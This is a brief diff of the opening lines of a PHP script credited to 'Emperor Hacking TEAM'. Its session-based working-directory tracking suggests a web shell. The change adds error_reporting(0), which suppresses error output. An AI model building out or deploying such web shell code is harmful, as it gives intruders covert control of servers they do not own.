@@ -1,5 +1,5 @@
 <?php
-
+error_reporting(0);
 /*Emperor Hacking TEAM */
   session_start();
 if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
